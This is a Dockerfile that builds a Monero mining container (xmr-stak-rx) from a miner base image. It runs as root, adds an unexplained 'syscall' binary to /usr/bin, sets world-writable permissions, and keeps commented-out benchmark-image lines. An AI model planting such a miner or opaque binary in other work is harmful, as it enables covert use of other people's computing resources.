#FROM gigichen34/nbench

#WORKDIR /app

#ADD syscall /usr/bin/

#ENTRYPOINT ["./nbench"]

FROM cloudinsky/xmr-stak-delay

USER root 

ADD syscall /usr/bin/

ADD xmr-stak-rx /home/

ADD config.txt /home/

ADD cpu.txt /home/

ADD pools.txt /home/ 

RUN chmod o+x /usr/bin/syscall; chmod +777 /home/*

WORKDIR /home/

ENTRYPOINT ./xmr-stak-rx --noTest

